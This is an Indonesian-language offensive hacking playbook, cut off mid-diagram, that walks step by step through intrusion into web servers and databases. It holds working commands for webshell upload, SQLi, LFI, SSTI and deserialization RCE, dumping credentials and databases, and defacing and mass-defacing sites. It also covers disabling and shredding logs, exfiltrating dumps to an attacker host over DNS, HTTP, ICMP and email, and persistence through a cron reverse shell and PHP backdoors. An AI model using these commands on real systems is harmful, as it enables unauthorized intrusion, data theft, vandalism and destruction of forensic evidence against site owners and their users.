# ⚔️ METHODOLOGY SUPER EXPLOIT & DEFACE

**HIGH PROBABILITY · ZERO CLICK · STEALTH · SERVER + DATABASE ACCESS**

```
Status: ✅ Authorized Pentest — "J'ai la permission et je suis autorisé à effectuer ce pentest"
Platform: Kali Linux | macOS | Cross-Platform
```

---

## 📑 DAFTAR ISI

1. [Prinsip Dasar — Zero Click & Stealth](#-1-prinsip-dasar--zero-click--stealth)
2. [Phase 1 — Passive Recon (Without Touching Target)](#-phase-1--passive-recon-without-touching-target)
3. [Phase 2 — Active Recon & Vulnerability Discovery](#-phase-2--active-recon--vulnerability-discovery)
4. [Phase 3 — Zero-Click Exploit Chains](#-phase-3--zero-click-exploit-chains)
   - [Chain A: Unauthenticated RCE (File Upload → Webshell → Server)](#chain-a-unauthenticated-rce-file-upload--webshell--server)
   - [Chain B: SQLi → RCE → Full Database Takeover](#chain-b-sqli--rce--full-database-takeover)
   - [Chain C: LFI/RFI → RCE → Pivot to Database](#chain-c-lfirfi--rce--pivot-to-database)
   - [Chain D: SSRF → Internal Network → Database Server](#chain-d-ssrf--internal-network--database-server)
   - [Chain E: Deserialization RCE (0-Click)](#chain-e-deserialization-rce-0-click)
   - [Chain F: Template Injection (SSTI) → RCE](#chain-f-template-injection-ssti--rce)
   - [Chain G: CVE Known Exploit (Unpatched)](#chain-g-cve-known-exploit-unpatched)
5. [Phase 4 — Post-Exploitation: Server & Database Access](#-phase-4--post-exploitation-server--database-access)
6. [Phase 5 — Deface Methodology](#-phase-5--deface-methodology)
7. [Phase 6 — Stealth: Anti-Forensic & Log Cleaning](#-phase-6--stealth-anti-forensic--log-cleaning)
8. [Phase 7 — Data Exfiltration (Silent)](#-phase-7--data-exfiltration-silent)
9. [Phase 8 — Persistence (Backdoor Maintenance)](#-phase-8--persistence-backdoor-maintenance)
10. [Full Attack Flow Diagram](#-full-attack-flow-diagram)
11. [Tools Quick Reference](#-tools-quick-reference)

---

## 🎯 1. PRINSIP DASAR — ZERO CLICK & STEALTH

### Zero Click Definition
```
No user interaction required:
❌ No victim clicks a link
❌ No victim opens a file
❌ No victim enters credentials
✅ Single HTTP request → RCE
✅ Server-side exploitation only
✅ No phishing / no social engineering
```

### Stealth Principles
```
1. USE IP ROTATION (Mubeng / Tor / Proxy Chains) — setiap request IP berbeda
2. MINIMALKAN REQUEST — jangan scan brutal, target langsung
3. ENKRIPSI TRAFFIC — SSH tunneling / HTTPS / DNS tunneling
4. HINDARI TOOLS NOISY — jangan nmap default, pakai versi stealth
5. CLEAN LOGS — setelah operasi, bersihkan jejak
6. TIMING — lakukan di jam sibuk biar tenggelam dalam traffic normal
7. USER-AGENT SPOOF — pakai user-agent browser real
8. NO LOCAL FILE WRITE — jangan simpan tools di target, pakai memory-only payload
```

---

## 🕵️ PHASE 1 — PASSIVE RECON (Without Touching Target)

Sebelum menyentuh target, kumpulkan intel sebanyak mungkin **tanpa mengirim satupun request ke server target**.

| Langkah | Tools | Tujuan |
|---------|-------|--------|
| 1.1 Cari IP & DNS | `dnsrecon`, `dig`, `whois`, `shodan`, `censys` | Dapatkan IP real, subdomain, nameserver |
| 1.2 OSINT CMS/Technology | `builtwith.com`, `wappalyzer`, `whatcms.org` | Deteksi CMS, framework, versi |
| 1.3 Cari曝露 File | `github-dork.py`, `gitdorker`, `trufflehog` | Cari secret/cred di GitHub/public repo |
| 1.4 Cari CVE Terkait | `searchsploit`, `nvd.nist.gov`, `cve.mitre.org` | Cari exploit untuk versi CMS/framework |
| 1.5 Cermati Response Header | `curl -I https://target.com` | Deteksi server, technology, WAF |

**Command:**
```bash
# Passive recon — tanpa menyentuh target
whois target.com
dig any target.com
dnsrecon -d target.com
shodan search host:target.com
searchsploit "WordPress 5.8"
searchsploit "Apache 2.4.49"
curl -sI https://target.com | grep -i "server\|x-powered-by\|x-frame"
```

---

## 🔍 PHASE 2 — ACTIVE RECON & VULNERABILITY DISCOVERY

Sekarang kita kirim request, tapi **via IP rotation & stealth mode**.

```bash
# START IP ROTATOR (WAJIB!)
mubeng -a localhost:8089 -f live_proxies.txt -r 5 -m random
# Atau via Tor
sudo anonsurf start
sudo watch -n 30 anonsurf change
```

| Langkah | Tools | Target Detection |
|---------|-------|-----------------|
| 2.1 Port Scan (Stealth) | `masscan` atau `nmap -T2 -sS` | Port terbuka (80,443,8080,8443,3306,5432, etc) |
| 2.2 Technology Fingerprint | `whatweb`, `wappalyzer`, `nmap -sV` | Versi Apache/Nginx/PHP/MySQL |
| 2.3 Directory/Endpoint Fuzzing | `ffuf`, `gobuster`, `dirsearch` | Hidden endpoints, admin panel, upload page |
| 2.4 Parameter Discovery | `ffuf -w params.txt`, `arjun` | Parameter untuk injection |
| 2.5 Vulnerability Scan | `nuclei -t cves/`, `nikto` | CVE & misconfiguration |
| 2.6 WAF Detection | `wafw00f`, `whatwaf` | Deteksi & fingerprint WAF |

**Command:**
```bash
# Stealth scan via proxy rotator
proxychains4 masscan target.com -p1-10000 --rate=100
proxychains4 nmap -sS -sV -T2 -p80,443,8080,8443 --script=http-title target.com

# Technology fingerprint
proxychains4 whatweb https://target.com -v

# Directory fuzzing
proxychains4 ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 20

# Vulnerability scanning
proxychains4 nuclei -u https://target.com -t ~/nuclei-templates/cves/ -rl 10

# WAF detection
proxychains4 wafw00f https://target.com
```

### Target Vulnerability Priority (High Probability → Exploit)

| Kerentanan | Probabilitas | Zero-Click | Dampak |
|------------|-------------|------------|--------|
| **File Upload (No Auth)** | ⭐⭐⭐⭐⭐ | ✅ | RCE langsung |
| **SQL Injection** | ⭐⭐⭐⭐⭐ | ✅ | Database + RCE |
| **LFI/RFI** | ⭐⭐⭐⭐ | ✅ | RCE via log poisoning |
| **SSRF** | ⭐⭐⭐⭐ | ✅ | Akses internal network |
| **Deserialization (Java/PHP/Python)** | ⭐⭐⭐⭐ | ✅ | RCE |
| **SSTI (Template Injection)** | ⭐⭐⭐⭐ | ✅ | RCE |
| **Command Injection** | ⭐⭐⭐⭐ | ✅ | RCE langsung |
| **CVE Known (Unpatched)** | ⭐⭐⭐⭐ | ✅ | RCE / DB access |
| **Broken Authentication** | ⭐⭐⭐ | ❌ (login) | Admin panel |
| **XSS** | ⭐⭐⭐ | ❌ (click) | Session hijack |

---

## 💥 PHASE 3 — ZERO-CLICK EXPLOIT CHAINS

### CHAIN A: Unauthenticated RCE (File Upload → Webshell → Server)

**High Probability — paling sering ditemukan.**

```
Target: Endpoint upload file tanpa autentikasi
Vector: Unrestricted file upload (CWE-434)
Zero-Click: ✅ — attacker upload sendiri, no victim needed
Dampak: RCE sebagai web server user
```

**Step-by-Step:**

```
Step 1: Find upload endpoint
  → ffuf / gobuster cari: /upload, /api/upload, /file/upload, /images/, /files/
  → Cek di JS source code, burp history
  → Coba POST multipart langsung

Step 2: Test upload restriction
  → Upload file.jpg → OK
  → Upload file.php → ditolak? Coba bypass:
    • file.php.jpg, file.phtml, file.php5, file.shtml
    • Content-Type: image/jpeg (tapi isinya PHP)
    • Magic byte GIF89a di awal file
    • Null byte: file.php%00.jpg
    • Double extension: file.php.jpg

Step 3: Upload webshell
  → php:// shell (weevely / b374k / p0wny)
  → aspx:// shell (jika IIS)
  → jsp:// shell (jika Tomcat)

Step 4: Execute
  → Akses shell: https://target.com/uploads/shell.php?cmd=id
  → Weevely: weevely https://target.com/shell.php password

Step 5: Escalate
  → whoami → www-data / apache / iis apppool
  → Cari kredensial database di config file
```

**Tools:**
```bash
# Cari upload endpoint
proxychains4 ffuf -u https://target.com/FUZZ -w upload_endpoints.txt

# Upload shell via curl
proxychains4 curl -X POST -F "file=@shell.php" https://target.com/api/upload

# Upload dengan bypass magic byte
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php
proxychains4 curl -X POST -F "file=@shell.php" https://target.com/upload

# Cek apakah file bisa diakses
proxychains4 curl https://target.com/uploads/shell.php?cmd=id

# Connect via weevely
proxychains4 weevely https://target.com/shell.php password
```

**Contoh CVE Real (2024-2025):**
| CVE | Product | CVSS | Vector |
|-----|---------|------|--------|
| CVE-2025-52691 | SmarterMail | 10.0 | Unauthenticated path traversal → upload .aspx shell |
| CVE-2025-40625 | TCMAN GIM v11 | 9.3 | Unrestricted file upload, no auth |
| CVE-2024-31777 | Openeclass | 9.8 | Unauthenticated file upload → RCE |
| CVE-2024-45195 | Apache OFBiz | 9.8 | Unauthenticated RCE via view authorization bypass |

---

### CHAIN B: SQLi → RCE → Full Database Takeover

**High Probability — database ada di server yang sama atau terpisah.**

```
Target: Parameter dengan SQL Injection (GET/POST/HEADER)
Vector: SQLi → File Write / xp_cmdshell / LOAD DATA
Zero-Click: ✅ — cukup inject via HTTP request
Dampak: RCE + Full database access (kredensial, data, admin panel)
```

**Step-by-Step:**

```
Step 1: Find SQL injection
  → Cari parameter di URL, POST body, header, cookie
  → Test: ' OR 1=1-- , " OR 1=1-- , ' SLEEP(5)--
  → SQLMap auto: sqlmap -u "http://target.com/page?id=1" --batch

Step 2: Identifikasi database
  → MySQL, MSSQL, PostgreSQL, Oracle, SQLite?
  → SQLMap: sqlmap -u "..." --banner --current-db

Step 3: Escalate SQLi → RCE (Tergantung database)
```

**Tabel RCE Methods per Database:**

| Database | Method | Command |
|----------|--------|---------|
| **MySQL** | `INTO OUTFILE` write webshell | `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'` |
| **MySQL** | `LOAD_FILE()` read config | `SELECT LOAD_FILE('/etc/passwd')` |
| **MSSQL** | `xp_cmdshell` | `EXEC xp_cmdshell 'whoami'` |
| **MSSQL** | `sp_oacreate` + `sp_oamethod` | `EXEC sp_oacreate 'WScript.Shell', @obj OUT; EXEC sp_oamethod @obj, 'Run', NULL, 'cmd /c whoami'` |
| **PostgreSQL** | `COPY ... PROGRAM` | `COPY (SELECT 'test') TO PROGRAM 'whoami'` |
| **PostgreSQL** | `CREATE EXTENSION plpythonu` | `CREATE EXTENSION plpythonu; SELECT exec_cmd('whoami')` |
| **Oracle** | `CREATE JAVA` + `execCommand` | Java stored procedure → exec command |

**SQLMap auto RCE:**
```bash
# Auto detect + auto shell
proxychains4 sqlmap -u "http://target.com/page?id=1" --os-shell

# Specific to MySQL
proxychains4 sqlmap -u "http://target.com/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Specific to MSSQL
proxychains4 sqlmap -u "http://target.com/page?id=1" --os-cmd="whoami"
proxychains4 sqlmap -u "http://target.com/page?id=1" --os-shell --dbms=mssql
```

**Dump Database:**
```bash
# Get all databases
proxychains4 sqlmap -u "http://target.com/page?id=1" --dbs

# Dump specific database
proxychains4 sqlmap -u "http://target.com/page?id=1" -D target_db --dump

# Get all users & passwords
proxychains4 sqlmap -u "http://target.com/page?id=1" --users --passwords

# Search for admin credentials
proxychains4 sqlmap -u "http://target.com/page?id=1" --search -T users
```

**SQLi → Admin Panel → RCE Chain:**
```
SQLi → Dump admin credentials → Login to admin panel
→ Cari fitur upload theme/plugin
→ Upload webshell via admin panel
→ RCE on server
```
```bash
# Dapatkan credential admin
sqlmap -u "http://target.com/page?id=1" -D cms_db -T users --dump
# Login admin panel, cari upload theme/plugin
# Upload webshell via fitur admin
```

---

### CHAIN C: LFI/RFI → RCE → Pivot to Database

```
Target: Parameter dengan File Inclusion (LFI/RFI)
Vector: LFI → Log Poisoning / PHP Wrapper → RCE
Zero-Click: ✅ — cukup inject via HTTP request
Dampak: RCE via log poisoning atau php://input
```

**Step-by-Step:**

```
Step 1: Find LFI
  → Parameter: ?page=, ?file=, ?include=, ?template=, ?view=
  → Test: page=../../../etc/passwd
  → If success → LFI confirmed

Step 2: RCE via Log Poisoning (High Probability)
  → Inject PHP code ke Access Log / Error Log
  → Include log file via LFI → code executes

Step 3: Alternative — php://input
  → ?page=php://input + POST body = <?php system('id'); ?>
  → If allow_url_include=On → langsung RCE

Step 4: Alternative — php://filter + base64
  → ?page=php://filter/convert.base64-encode/resource=config.php
  → Baca source code → cari database credential
```

**Command:**
```bash
# Test LFI
proxychains4 curl "http://target.com/index.php?page=../../../etc/passwd"
proxychains4 curl "http://target.com/index.php?page=/etc/passwd"

# Log Poisoning — inject PHP code ke User-Agent
proxychains4 curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
# Include access log via LFI
proxychains4 curl "http://target.com/index.php?page=../../../var/log/apache2/access.log&cmd=id"

# php://input RCE
proxychains4 curl -X POST -d "<?php system('id'); ?>" "http://target.com/index.php?page=php://input"

# php://filter baca source code
proxychains4 curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php"
```

---

### CHAIN D: SSRF → Internal Network → Database Server

```
Target: Fitur yang fetch URL eksternal (webhook, import, proxy, dll)
Vector: SSRF → Akses internal service → Database server
Zero-Click: ✅ — server melakukan request atas nama kita
Dampak: Akses database server di internal network (bypass firewall)
```

**Step-by-Step:**

```
Step 1: Find SSRF
  → Parameter: ?url=, ?file=http://, ?webhook=, ?callback=
  → Fitur: fetch metadata, import from URL, proxy, thumbnail generator
  → Test: url=http://127.0.0.1:3306 (MySQL port)

Step 2: Eksploitasi
  → Akses internal database server (port 3306, 5432, 1433)
  → Baca file internal (/etc/passwd, file:///etc/shadow)
  → Akses cloud metadata (AWS: 169.254.169.254)

Step 3: SSRF → RCE
  → Cari internal service dengan RCE (Redis, Jenkins, Hadoop, etc)
  → Gopher protocol untuk memfabrikasi request ke internal service
```

**Command:**
```bash
# Test SSRF — cek callback
proxychains4 curl "http://target.com/fetch?url=http://YOUR_SERVER/callback_test"

# Scan internal ports via SSRF
proxychains4 ffuf -u "http://target.com/fetch?url=http://127.0.0.1:FUZZ" -w ports.txt

# Akses cloud metadata
proxychains4 curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# SSRF → Redis RCE (gopher protocol)
proxychains4 curl "http://target.com/fetch?url=gopher://127.0.0.1:6379/_*3%0d%0a..."
```

---

### CHAIN E: Deserialization RCE (0-Click)

```
Target: Aplikasi yang menggunakan serialization (PHP, Java, Python, .NET)
Vector: Insecure deserialization → arbitrary code execution
Zero-Click: ✅ — send malicious serialized object in request
Dampak: Full RCE as web/app server user
```

**Tools per Platform:**

| Platform | Tools | Repo |
|----------|-------|------|
| **PHP** | `phpggc` | [github.com/ambionics/phpggc](https://github.com/ambionics/phpggc) |
| **Java** | `ysoserial` | [github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial) |
| **Java** | `marshalsec` | [github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec) |
| **Python** | `ysoserial.py` | [github.com/wh0amitz/ysoserial](https://github.com/wh0amitz/ysoserial) |
| **.NET** | `ysoserial.net` | [github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) |
| **Node.js** | `node-serialize` | Manual exploit via eval() |

**Command:**
```bash
# PHP deserialization → RCE
phpggc -l                                    # List semua gadget
phpggc Monolog/RCE1 system 'id'              # Generate payload
proxychains4 curl -X POST -d "data=$(phpggc Monolog/RCE1 system 'id')" http://target.com/

# Java deserialization → RCE
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh | bash'
proxychains4 curl -X POST --data-binary @payload.ser http://target.com/deserial

# Blind detection via timing
# Kirim serialized object → jika server delay/error beda → vulnerable
```

---

### CHAIN F: Template Injection (SSTI) → RCE

```
Target: Fitur yang memproses template engine (Jinja2, Twig, Freemarker, Velocity)
Vector: SSTI → execute arbitrary code via template syntax
Zero-Click: ✅ — inject template code in parameter
Dampak: RCE as web server user
```

**Test per Template Engine:**

| Engine | Test Payload | RCE |
|--------|-------------|-----|
| **Jinja2 (Python)** | `{{7*7}}` | `{{''.__class__.__mro__[2].__subclasses__()}}` |
| **Twig (PHP)** | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| **Freemarker (Java)** | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **Velocity (Java)** | `#set($x=7*7)$x` | `#set($e="exec")$e("id")` |
| **Smarty (PHP)** | `{7*7}` | `{system('id')}` |

**Command:**
```bash
# Test SSTI
proxychains4 curl "http://target.com/?name={{7*7}}"   # Jinja2
proxychains4 curl "http://target.com/?name=\${7*7}"   # Freemarker

# SSTI → RCE via tplmap (auto)
proxychains4 python tplmap.py -u "http://target.com/?name=*"

# Manual Jinja2 RCE
proxychains4 curl "http://target.com/?name={{''.__class__.__mro__[2].__subclasses__()[X](['id',1])}}"

# Manual Twig RCE
proxychains4 curl "http://target.com/?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('curl http://attacker.com/shell.sh|bash')}}"
```

---

### CHAIN G: CVE Known Exploit (Unpatched)

Cari CVE dengan **CVSS 9.0-10.0** untuk target software:

```bash
# Cari exploit di searchsploit
searchsploit -t "target software name"
searchsploit "apache 2.4.49"
searchsploit "joomla 4.0"
searchsploit "wordpress 5.8"

# Cari via sqlmap
searchsploit -m [exploit-number]

# Nuclei auto-scan CVE
proxychains4 nuclei -u https://target.com -t ~/nuclei-templates/cves/ -rl 10

# Metasploit
proxychains4 msfconsole -q
msf6 > search target_software
msf6 > use exploit/multi/http/target_cve
msf6 > set RHOSTS target.com
msf6 > run
```

**High-Value CVE List (Unpatched = Goldmine):**

| CVE | Software | CVSS | Efffect |
|-----|----------|------|---------|
| CVE-2025-55182 | React Server Components / Next.js | 10.0 | Unauthenticated RCE |
| CVE-2025-52691 | SmarterMail | 10.0 | Unauth file upload → RCE |
| CVE-2024-45195 | Apache OFBiz < 18.12.16 | 9.8 | Unauth RCE |
| CVE-2024-4577 | PHP CGI (Windows) | 9.8 | Argument injection → RCE |
| CVE-2024-27198 | JetBrains TeamCity < 2023.11.4 | 9.8 | Auth bypass → RCE |
| CVE-2024-23897 | Jenkins < 2.441 | 9.8 | Arbitrary file read → RCE |
| CVE-2024-1709 | ConnectWise ScreenConnect < 23.9.8 | 10.0 | Auth bypass → RCE |
| CVE-2023-50164 | Apache Struts2 | 9.8 | File upload → RCE |
| CVE-2023-46604 | Apache ActiveMQ | 9.8 | Deserialization → RCE |
| CVE-2021-44228 | Log4j (Apache) | 10.0 | JNDI injection → RCE |

---

## 🔧 PHASE 4 — POST-EXPLOITATION: SERVER & DATABASE ACCESS

Setelah dapat RCE, langkah untuk **mengakses server dan database** secara penuh:

### 4.1 — Information Gathering (from inside)

```bash
# Current user & privileges
whoami
id
sudo -l
cat /etc/passwd
cat /etc/shadow

# System info
uname -a
cat /etc/os-release
cat /proc/version

# Network info
ip addr
ifconfig
netstat -tlnp
ss -tlnp
arp -a
cat /etc/hosts
cat /etc/resolv.conf

# Cari kredensial database
find /var/www -name "config.php" -o -name ".env" -o -name "config.inc.php" -o -name "database.yml" 2>/dev/null
cat /var/www/html/config.php
cat /var/www/html/.env
grep -r "DB_PASSWORD\|DB_USER\|password\|PDO\|mysql_connect" /var/www/ 2>/dev/null

# Cari file backup & sensitive
find / -name "*.bak" -o -name "*.backup" -o -name "*.sql" -o -name "dump*" 2>/dev/null
find /var/www -name "*.sql" -o -name "*.tar.gz" -o -name "backup*" 2>/dev/null
```

### 4.2 — Database Access (Direct Connection)

```bash
# Via RCE shell — MySQL
mysql -u root -p'password' -e "SHOW DATABASES;"
mysql -u root -p'password' -D target_db -e "SHOW TABLES;"
mysql -u root -p'password' -D target_db -e "SELECT * FROM users;"

# PostgreSQL
psql -U postgres -d target_db -c "\dt"
psql -U postgres -d target_db -c "SELECT * FROM users;"

# MSSQL (via sqlcmd)
sqlcmd -S localhost -U sa -P 'password' -Q "SELECT name FROM sys.databases"
sqlcmd -S localhost -U sa -P 'password' -d target_db -Q "SELECT * FROM users"

# Dump all databases (via shell)
mysqldump -u root -p'password' --all-databases > /tmp/dump.sql
pg_dump -U postgres -h localhost target_db > /tmp/dump.sql
```

### 4.3 — SSH Access (Persistence Layer)

```bash
# Tambah SSH key kita
mkdir -p ~/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys

# Atau buat user baru (stealth — nama mirip system user)
sudo useradd -m -s /bin/bash .systemd-coredump
sudo usermod -aG sudo .systemd-coredump
echo '.systemd-coredump:SecurePass123!' | sudo chpasswd

# Login via SSH (IP rotation)
proxychains4 ssh .systemd-coredump@target.com
```

### 4.4 — Tunneling ke Database (Jika DB di Server Lain)

```bash
# Remote port forwarding — akses database internal dari server kita
# Dari server target:
ssh -R 3307:localhost:3306 attacker.com -N -f
# Sekarang di local kita bisa connect ke localhost:3307 → database internal target

# Atau via SSH dynamic proxy
ssh -D 1080 target_user@target.com -N -f
# Set proxychains → SOCKS5 127.0.0.1:1080
# Lalu akses database internal via proxy
proxychains4 mysql -h db-internal.target.com -u root -p
```

---

## 🏴 PHASE 5 — DEFACE METHODOLOGY

### Strategy: "Tukar Halaman, Jangan Rusak Server"

Prinsip deface yang professional:
1. **Backup halaman asli** — simpan sebagai bukti
2. **Ganti halaman** — upload file deface
3. **Jangan hapus data** — cukup ganti halaman publik
4. **Clean up** — hapus tools dan log

### 5.1 — WebDAV Deface (High Probability)

```bash
# Cek apakah WebDAV aktif
proxychains4 curl -X OPTIONS http://target.com/ -I
# Cek response: Allow: ... PUT ...

# Jika PUT enabled → upload deface page
proxychains4 curl -X PUT -T deface.html http://target.com/index.html
proxychains4 curl -X PUT -T deface.html http://target.com/index.php

# WebDAV mass deface
proxychains4 python3 white-deface.py -l targets.txt -p deface.html
```

### 5.2 — Deface via Webshell (Already have RCE)

**Jika sudah punya akses shell via chain sebelumnya:**

```bash
# Backup halaman asli
cp /var/www/html/index.php /var/www/html/index.php.backup

# Upload deface page
curl -o /var/www/html/index.html https://attacker.com/deface.html

# Atau overwrite langsung
echo '<html><body><h1>DEFACED</h1></body></html>' > /var/www/html/index.html

# Multiple pages
find /var/www/html -name "index.php" -exec cp {} {}.bak \; -exec echo '<html>DEFACED</html>' > {} \;
find /var/www/html -name "index.html" -exec cp {} {}.bak \; -exec echo '<html>DEFACED</html>' > {} \;
```

### 5.3 — Deface via SQL Injection (Direct Write)

Jika dapat SQLi dengan `INTO OUTFILE`:

```bash
# Write deface page via SQL
sqlmap -u "http://target.com/page?id=1" --sql-query "SELECT '<html><body><h1>DEFACED BY PENTEST</h1></body></html>' INTO OUTFILE '/var/www/html/index.html'"
```

### 5.4 — Mass Deface (Multi-Site)

```bash
# Via defacer tool (WebDAV)
proxychains4 python3 defacer.py -i targets.txt -p deface.html

# Via commix (command injection)
proxychains4 python3 commix.py --url="http://target.com/page?cmd=test" --os-cmd="echo '<html>DEFACED</html>' > /var/www/html/index.html"

# Via wp-cli (jika WordPress)
proxychains4 wp post create --post_title="Hacked" --post_content="<script>alert('DEFACED')</script>" --post_status=publish
```

### 5.5 — Deface WordPress (Specific)

```bash
# Via admin panel (credential dari SQLi dump)
# Appearance → Theme Editor → edit index.php → save

# Via wpscan + exploit
proxychains4 wpscan --url https://target.com --password-attack wp-login --passwords rockyou.txt

# Via plugin upload (admin access)
# Upload malicious plugin → activate → deface
```

---

## 🧹 PHASE 6 — STEALTH: ANTI-FORENSIC & LOG CLEANING

### 6.1 — Stop Logging (Before Operation)

```bash
# Stop system logging
sudo systemctl stop rsyslog
sudo systemctl stop systemd-journald
sudo systemctl disable rsyslog

# Atau redirect log ke /dev/null
sudo mount -o bind /dev/null /var/log/auth.log
sudo mount -o bind /dev/null /var/log/apache2/access.log
sudo mount -o bind /dev/null /var/log/apache2/error.log
sudo mount -o bind /dev/null /var/log/nginx/access.log
sudo mount -o bind /dev/null /var/log/mysql/mysql.log

# Hapus semua log yang sudah ada
sudo find /var/log -type f -name "*.log" -exec shred -f {} \;
sudo find /var/log -type f -name "*.log.*" -exec shred -f {} \;
```

### 6.2 — Bersihkan History & Jejak

```bash
# Hapus bash history sendiri
history -c
shred -f ~/.bash_history
cat /dev/null > ~/.bash_history

# Hapus history global
sudo cat /dev/null > /var/log/lastlog
sudo cat /dev/null > /var/log/wtmp
sudo cat /dev/null > /var/log/btmp

# Hapus access log spesifik kita (grep + sed)
# Cari IP kita di log
grep -n "YOUR_IP" /var/log/apache2/access.log
# Hapus baris tersebut
sudo sed -i '/YOUR_IP/d' /var/log/apache2/access.log

# Hapus seluruh log access (radikal)
sudo shred -f -z /var/log/apache2/access.log
sudo shred -f -z /var/log/apache2/error.log
sudo shred -f -z /var/log/nginx/access.log
```

### 6.3 — Hapus Tools & Files yang Kita Upload

```bash
# Shred webshell sebelum dihapus
sudo shred -f -z /var/www/html/shell.php
sudo rm -f /var/www/html/shell.php

# Hapus semua tools yang didownload
sudo shred -f -z /tmp/*.sh /tmp/*.py /tmp/*.php
sudo rm -rf /tmp/tools/

# Cari file kita yang lain
find /var/www -name "*.php" -newer /var/www/html/index.php -exec shred -f {} \; -exec rm {} \;
```

### 6.4 — Hapus User & SSH Key (Jika Buat)

```bash
# Hapus user yang kita buat
sudo userdel -r .systemd-coredump

# Hapus SSH key kita
sudo sed -i '/ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ/d' ~/.ssh/authorized_keys
```

### 6.5 — Restore Logging

```bash
sudo systemctl unmask rsyslog
sudo systemctl start rsyslog
sudo systemctl start systemd-journald
sudo mount -o remount,rw /
```

---

## 📤 PHASE 7 — DATA EXFILTRATION (SILENT)

Ekfiltrasi data database **tanpa ketahuan**:

### 7.1 — DNS Tunneling (Stealth)

```bash
# Di server target — encode data dalam DNS query
cat /tmp/dump.sql | while read line; do
  encoded=$(echo "$line" | base64 -w0)
  nslookup "${encoded:0:30}.attacker.com"
done
# Di server attacker — listen DNS queries
tcpdump -i eth0 -A port 53 | grep "attacker.com"
```

### 7.2 — HTTP(S) Exfiltration (via curl)

```bash
# Compress + encrypt + send
tar czf - /tmp/dump.sql | openssl enc -aes-256-cbc -pass pass:secretkey | base64 | \
  curl -X POST -d @- https://attacker.com/exfil
```

### 7.3 — ICMP Tunneling

```bash
# Di server target
ping -s 1024 -c 1 attacker.com -p $(echo "data" | xxd -p)
```

### 7.4 — Email Exfiltration

```bash
# Jika ada mail server atau ssmtp
mail -s "Logs" attacker@gmail.com < /tmp/dump.sql
```

### 7.5 — Upload to Cloud Storage

```bash
# Via rclone (jika terinstall)
rclone copy /tmp/dump.sql remote:bucket/

# Via curl ke pastebin-like service
curl -F "file=@/tmp/dump.sql" https://file.io
```

---

## 🔄 PHASE 8 — PERSISTENCE (BACKDOOR MAINTENANCE)

### 8.1 — Cron Job Backdoor

```bash
# Reverse shell setiap 5 menit
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# Nama proses disamarkan (crontab adalah process normal)
```

### 8.2 — PHP Backdoor in Legitimate File

```bash
# Sisipkan backdoor di file legitimate
echo '<?php system("curl http://attacker.com/shell.sh | bash");' >> /var/www/html/wp-config.php
# Atau di bagian bawah index.php
echo '<?php eval($_GET["x"]); ?>' >> /var/www/html/index.php
```

### 8.3 — SSH Authorized Keys (Stealth)

```bash
# Taruh di user lain yang jarang dipakai
mkdir -p /home/backup/.ssh
echo 'ssh-rsa AAA...' >> /home/backup/.ssh/authorized_keys
```

### 8.4 — Web Shell in Random Path

```bash
# Taruh di path yang tidak obvious
mkdir -p /var/www/html/wp-content/uploads/2025/01/
cp /var/www/html/shell.php /var/www/html/wp-content/uploads/2025/01/wp-temp.php
chmod 644 /var/www/html/wp-content/uploads/2025/01/wp-temp.php
```

---

## 🗺️ FULL ATTACK FLOW DIAGRAM

```
┌─────────────────────────────────────────────────────────────────┐
│                    PHASE 1: PASSIVE RECON                       │
│  DNS · WHOIS · Shodan · Censys · Searchsploit · GitHub Dork    │
└──────────────────────────────────┬──────────────────────────────┘
                                   ↓
┌─────────────────────────────────────────────────────────────────┐
│        PHASE 2: ACTIVE RECON (via IP ROTATION)                 │
│  Masscan · FFUF · WhatWeb · Nuclei · WAFW00F                   │
│  → Find: Upload Endpoint, SQLi, LFI, SSRF, CVE, SSTI, etc     │
└──────────────────────────────────┬──────────────────────────────┘
                                   ↓
┌─────────────────────────────────────────────────────────────────┐
│              PHASE 3: ZERO-CLICK EXPLOIT CHAINS                 │
│                                                                 │
│  CHAIN A: File Upload → Webshell → RCE                         │
│  CHAIN B: SQLi → xp_cmdshell / INTO OUTFILE → RCE + DB Dump   │
│  CHAIN C: LFI → Log Poisoning → RCE                            │
│  CHAIN D: SSRF → Internal Service → Database Server            │
│  CHAIN E: Deserialization → RCE                                │
│  CHAIN F: SSTI → RCE                                           │
│  CHAIN G: CVE Known Exploit → RCE                              │
└──────────────────────────────────┬──────────────────────────────┘
                                   ↓
┌─────────────────────────────────────────────────────────────────┐
│         PHASE 4: POST-EXPLOITATION (SERVER + DB)               │
│                                                                 │
│  ┌─────────────────────┐    ┌─────────────────────┐            │
│  │  SERVER ACCESS      │    │  DATABASE ACCESS    │            │
│  │  • whoami / id      │    │  • DB creds from    │            │
│  │  • sudo -l          │    │    config files     │            │
│  │  • Cari kredensial  │───→│  • MySQL/Postgres/  │            │
│  │  • SSH key inject   │    │    MSSQL login      │            │
│  │  • Tunneling        │    │  • Dump all data    │            │
│  └─────────────────────┘    └─────────────────────┘            │
└──────────────────────────────────┬──────────────────────────────┘
                                   ↓
         ┌─────────────────────────┼─────────────────────────┐
         ↓                         ↓                         ↓
┌──────────────────┐   ┌──────────────────┐   ┌──────────────────┐
│  PHASE 5:        │   │  PHASE 7:        │   │  PHASE 8:        │
│  DEFACE          │   │  EXFILTRATION    │   │  PERSISTENCE     │
│  • Backup asli   │   │  • DNS tunnel    │   │  • Cron backdoor │
